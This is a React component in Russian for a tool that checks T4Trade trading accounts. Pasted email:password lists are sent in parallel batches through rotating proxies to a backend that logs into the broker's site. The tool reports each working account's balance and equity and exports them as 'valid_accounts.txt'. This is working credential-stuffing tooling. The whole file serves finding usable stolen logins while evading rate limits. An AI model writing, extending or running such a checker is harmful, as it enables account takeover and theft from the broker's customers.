import { useState, useRef } from 'react';
import Icon from '@/components/ui/icon';
import { getProxyConfig } from '@/lib/proxyConfig';

const API_URL = 'https://functions.poehali.dev/89956202-dc65-4543-8725-c4a0ad815187';

interface AccountResult {
  id: number;
  value: string;
  status: 'pending' | 'checking' | 'valid' | 'invalid' | 'error';
  details?: string;
  balance?: string;
  equity?: string;
  accounts?: { account_number?: string; balance?: string; equity?: string; currency?: string }[];
  checkedAt?: string;
}

export default function CheckerSection() {
  const [rawInput, setRawInput] = useState('');
  const [results, setResults] = useState<AccountResult[]>([]);
  const [isRunning, setIsRunning] = useState(false);
  const [threads, setThreads] = useState(5);
  const [progress, setProgress] = useState(0);
  const [stats, setStats] = useState({ valid: 0, invalid: 0, errors: 0, total: 0 });
  const stopRef = useRef(false);

  const parseAccounts = (text: string): string[] =>
    text.split('\n').map(l => l.trim()).filter(l => l.includes(':'));

  const runCheck = async () => {
    const lines = parseAccounts(rawInput);
    if (!lines.length) return;
    stopRef.current = false;
    setIsRunning(true);
    setProgress(0);
    setStats({ valid: 0, invalid: 0, errors: 0, total: lines.length });

    const initial: AccountResult[] = lines.map((v, i) => ({ id: i, value: v, status: 'pending' }));
    setResults(initial);

    const batchSize = Math.min(threads, 10);
    let done = 0;
    let validCount = 0;
    let invalidCount = 0;
    let errorCount = 0;

    for (let i = 0; i < lines.length; i += batchSize) {
      if (stopRef.current) break;

      const batch = lines.slice(i, i + batchSize);
      const batchIds = batch.map((_, k) => i + k);

      setResults(prev =>
        prev.map(r => batchIds.includes(r.id) ? { ...r, status: 'checking' } : r)
      );

      try {
        const proxyCfg = getProxyConfig();
        const proxyPayload = proxyCfg.enabled && proxyCfg.list.length
          ? { proxies: proxyCfg.list, proxy_type: proxyCfg.type, proxy_rotation: proxyCfg.rotation }
          : {};

        const resp = await fetch(API_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ accounts: batch, threads: batchSize, ...proxyPayload }),
        });

        const data = await resp.json();

        if (data.results) {
          const updates: Record<string, AccountResult> = {};

          for (const res of data.results) {
            if (res.status === 'valid') validCount++;
            else if (res.status === 'invalid') invalidCount++;
            else errorCount++;
            done++;

            const balanceStr = res.accounts?.[0]?.balance || res.raw_balance || '—';
            const equityStr = res.accounts?.[0]?.equity || res.raw_equity || '—';
            updates[res.login] = {
              id: -1,
              value: '',
              status: res.status as AccountResult['status'],
              details: res.status === 'valid'
                ? `Balance: ${balanceStr} · Equity: ${equityStr}`
                : res.error || 'Неверные данные',
              balance: balanceStr,
              equity: equityStr,
              accounts: res.accounts || [],
              checkedAt: new Date().toLocaleTimeString('ru-RU'),
            };
          }

          setResults(prev =>
            prev.map(r => {
              const login = r.value.split(':')[0];
              if (updates[login]) {
                return { ...r, ...updates[login], id: r.id, value: r.value };
              }
              return r;
            })
          );
        } else {
          done += batch.length;
          errorCount += batch.length;
        }
      } catch (e) {
        batchIds.forEach(() => errorCount++);
        done += batchIds.length;
        setResults(prev =>
          prev.map(r => batchIds.includes(r.id) ? { ...r, status: 'error', details: 'Ошибка сети' } : r)
        );
      }

      setProgress(Math.round((Math.min(i + batchSize, lines.length) / lines.length) * 100));
      setStats({ valid: validCount, invalid: invalidCount, errors: errorCount, total: lines.length });
    }

    setIsRunning(false);
  };

  const stopCheck = () => {
    stopRef.current = true;
    setIsRunning(false);
  };

  const clearAll = () => {
    setResults([]);
    setRawInput('');
    setProgress(0);
    setStats({ valid: 0, invalid: 0, errors: 0, total: 0 });
  };

  const statusBadge = (s: AccountResult['status']) => {
    if (s === 'valid') return <span className="status-valid mono text-xs font-semibold">✓ VALID</span>;
    if (s === 'invalid') return <span className="status-invalid mono text-xs font-semibold">✗ INVALID</span>;
    if (s === 'checking') return <span className="status-checking mono text-xs font-semibold animate-pulse">⟳ CHECK...</span>;
    if (s === 'error') return <span className="mono text-xs font-semibold text-yellow-400">! ERROR</span>;
    return <span className="mono text-xs text-gray-500">— PENDING</span>;
  };

  return (
    <div className="flex flex-col gap-5 animate-fade-up">
      <div className="flex items-center justify-between">
        <div>
          <h2 className="text-xl font-bold text-white">Проверка аккаунтов T4Trade</h2>
          <p className="text-sm text-gray-500 mt-0.5">Реальная проверка баланса через авторизацию на сайте</p>
        </div>
        <div className="flex items-center gap-2">
          {(() => {
            const pc = getProxyConfig();
            return pc.enabled && pc.list.length > 0 ? (
              <div className="flex items-center gap-2 glass-card px-3 py-2 rounded-xl border border-purple-500/25">
                <div className="w-2 h-2 rounded-full bg-purple-400 animate-pulse" />
                <span className="mono text-xs text-purple-400">PROXY: {pc.list.length} шт</span>
              </div>
            ) : (
              <div className="flex items-center gap-2 glass-card px-3 py-2 rounded-xl">
                <div className="w-2 h-2 rounded-full bg-gray-600" />
                <span className="mono text-xs text-gray-500">NO PROXY</span>
              </div>
            );
          })()}
          <div className="flex items-center gap-2 glass-card px-3 py-2 rounded-xl">
            <div className={`w-2 h-2 rounded-full ${isRunning ? 'bg-orange-400 animate-pulse' : 'bg-gray-600'}`} />
            <span className="mono text-xs text-gray-400">{isRunning ? 'RUNNING' : 'IDLE'}</span>
          </div>
        </div>
      </div>

      <div className="grid grid-cols-4 gap-3">
        {[
          { label: 'Всего', value: stats.total, color: 'text-gray-300', bg: 'rgba(255,255,255,0.03)' },
          { label: 'Валидных', value: stats.valid, color: 'text-green-400', bg: 'rgba(34,197,94,0.05)' },
          { label: 'Невалидных', value: stats.invalid, color: 'text-red-400', bg: 'rgba(239,68,68,0.05)' },
          { label: 'Ошибок', value: stats.errors, color: 'text-yellow-400', bg: 'rgba(251,191,36,0.05)' },
        ].map((s, i) => (
          <div key={i} className="neon-border rounded-xl p-4 text-center" style={{ background: s.bg }}>
            <div className={`text-2xl font-bold mono ${s.color}`}>{s.value}</div>
            <div className="text-xs text-gray-500 mt-1">{s.label}</div>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div className="glass-card neon-border rounded-xl p-4 flex flex-col gap-3">
          <div className="flex items-center justify-between">
            <span className="text-sm font-semibold text-gray-300">Список аккаунтов</span>
            <span className="mono text-xs text-gray-500">{parseAccounts(rawInput).length} строк</span>
          </div>
          <textarea
            value={rawInput}
            onChange={e => setRawInput(e.target.value)}
            placeholder={"email@example.com:password1\nlogin2@mail.com:password2"}
            className="mono text-xs bg-transparent border border-gray-700 rounded-lg p-3 text-gray-300 placeholder-gray-600 resize-none h-52 focus:outline-none focus:border-cyan-500/50 transition-colors"
          />
          <div className="flex flex-col gap-2">
            <div className="flex items-center gap-3">
              <label className="text-xs text-gray-500">Потоков (макс 10):</label>
              <input
                type="range"
                min={1}
                max={10}
                value={threads}
                onChange={e => setThreads(Number(e.target.value))}
                className="flex-1 accent-cyan-400"
              />
              <span className="mono text-sm text-cyan-400 w-6 text-right">{threads}</span>
            </div>
            <p className="text-[10px] text-gray-600 mono">Формат: email:пароль (по одному на строку)</p>
          </div>
        </div>

        <div className="glass-card neon-border rounded-xl p-4 flex flex-col gap-3">
          <div className="flex items-center justify-between">
            <span className="text-sm font-semibold text-gray-300">Результаты</span>
            {progress > 0 && <span className="mono text-xs text-cyan-400">{progress}%</span>}
          </div>

          {progress > 0 && (
            <div className="w-full bg-gray-800 rounded-full h-1.5 overflow-hidden">
              <div
                className="h-full progress-bar-glow rounded-full transition-all duration-500"
                style={{ width: `${progress}%` }}
              />
            </div>
          )}

          <div className="flex-1 overflow-y-auto h-52 space-y-1 pr-1">
            {results.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full text-gray-600">
                <Icon name="ScanLine" size={32} />
                <span className="text-xs mt-2">Результаты появятся здесь</span>
              </div>
            ) : (
              results.map(acc => (
                <div
                  key={acc.id}
                  className={`px-3 py-2 rounded-lg transition-all ${
                    acc.status === 'checking' ? 'bg-orange-500/8 border border-orange-500/20' :
                    acc.status === 'valid' ? 'bg-green-500/5 border border-green-500/10' :
                    acc.status === 'invalid' ? 'bg-red-500/5 border border-red-500/10' :
                    'border border-transparent'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="mono text-xs text-gray-400 truncate max-w-[170px]">{acc.value}</span>
                    <div className="flex items-center gap-2 shrink-0">
                      {acc.checkedAt && <span className="mono text-[10px] text-gray-600">{acc.checkedAt}</span>}
                      {statusBadge(acc.status)}
                    </div>
                  </div>
                  {acc.details && acc.status !== 'pending' && acc.status !== 'checking' && (
                    <div className={`mono text-[10px] mt-1 ${acc.status === 'valid' ? 'text-green-500/70' : 'text-gray-600'}`}>
                      {acc.details}
                    </div>
                  )}
                </div>
              ))
            )}
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        {!isRunning ? (
          <button
            onClick={runCheck}
            disabled={!parseAccounts(rawInput).length}
            className="cyber-btn px-6 py-2.5 rounded-xl text-sm font-semibold flex items-center gap-2 disabled:opacity-30 disabled:cursor-not-allowed"
          >
            <Icon name="Play" size={15} />
            Запустить проверку
          </button>
        ) : (
          <button
            onClick={stopCheck}
            className="px-6 py-2.5 rounded-xl text-sm font-semibold flex items-center gap-2 bg-red-500/15 border border-red-500/40 text-red-400 hover:bg-red-500/25 transition-all"
          >
            <Icon name="Square" size={15} />
            Остановить
          </button>
        )}
        <button
          onClick={clearAll}
          className="px-5 py-2.5 rounded-xl text-sm font-medium flex items-center gap-2 glass-card border border-gray-700 text-gray-400 hover:text-gray-200 hover:border-gray-500 transition-all"
        >
          <Icon name="Trash2" size={14} />
          Очистить
        </button>
        {results.filter(r => r.status === 'valid').length > 0 && (
          <button
            onClick={() => {
              const valid = results.filter(r => r.status === 'valid');
              const text = valid.map(r => `${r.value} | ${r.details || ''}`).join('\n');
              const blob = new Blob([text], { type: 'text/plain' });
              const a = document.createElement('a');
              a.href = URL.createObjectURL(blob);
              a.download = 'valid_accounts.txt';
              a.click();
            }}
            className="px-5 py-2.5 rounded-xl text-sm font-medium flex items-center gap-2 bg-green-500/10 border border-green-500/30 text-green-400 hover:bg-green-500/20 transition-all"
          >
            <Icon name="Download" size={14} />
            Скачать валидные ({results.filter(r => r.status === 'valid').length})
          </button>
        )}
      </div>
    </div>
  );
}